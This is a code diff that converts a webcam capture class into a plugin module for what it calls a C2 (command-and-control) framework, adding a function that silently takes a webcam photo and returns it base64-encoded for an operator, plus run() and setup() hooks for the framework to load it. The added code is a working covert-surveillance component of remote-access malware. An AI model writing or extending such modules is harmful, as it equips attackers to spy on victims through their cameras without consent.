@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import os
 import sys
 import platform
@@ -9,9 +10,14 @@ import threading
 import time
 from datetime import datetime
 import queue
+from io import BytesIO
+from PIL import Image
 
-class WebcamCapture:
+class Webcam:
     def __init__(self):
+        self.name = "webcam"
+        self.description = "Capture webcam image"
+        self.author = "Your C2 Framework"
         self.os_type = platform.system()
         self.setup_logging()
         self.is_running = False
@@ -117,4 +123,74 @@ class WebcamCapture:
             self.capture_thread.join()
         if self.save_thread:
             self.save_thread.join()
-        logging.info("Stopped webcam capture") 
+        logging.info("Stopped webcam capture")
+
+    def capture_image(self):
+        """
+        Capture an image from the webcam
+        """
+        try:
+            # Initialize webcam
+            cap = cv2.VideoCapture(0)
+            if not cap.isOpened():
+                return {
+                    "status": "error",
+                    "error": "Could not open webcam",
+                    "timestamp": datetime.now().isoformat()
+                }
+
+            # Capture frame
+            ret, frame = cap.read()
+            if not ret:
+                return {
+                    "status": "error",
+                    "error": "Failed to capture image",
+                    "timestamp": datetime.now().isoformat()
+                }
+
+            # Convert from BGR to RGB
+            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            
+            # Convert to PIL Image
+            image = Image.fromarray(frame_rgb)
+            
+            # Save to bytes
+            img_bytes = BytesIO()
+            image.save(img_bytes, format='PNG')
+            img_bytes = img_bytes.getvalue()
+            
+            # Release webcam
+            cap.release()
+            
+            # Encode to base64
+            img_b64 = base64.b64encode(img_bytes).decode()
+            
+            return {
+                "status": "success",
+                "timestamp": datetime.now().isoformat(),
+                "data": img_b64,
+                "format": "png",
+                "encoding": "base64"
+            }
+            
+        except Exception as e:
+            return {
+                "status": "error",
+                "error": str(e),
+                "timestamp": datetime.now().isoformat()
+            }
+        finally:
+            if 'cap' in locals():
+                cap.release()
+
+    def run(self, **kwargs):
+        """
+        Main execution method
+        """
+        return self.capture_image()
+
+def setup():
+    """
+    Module initialization
+    """
+    return Webcam() 
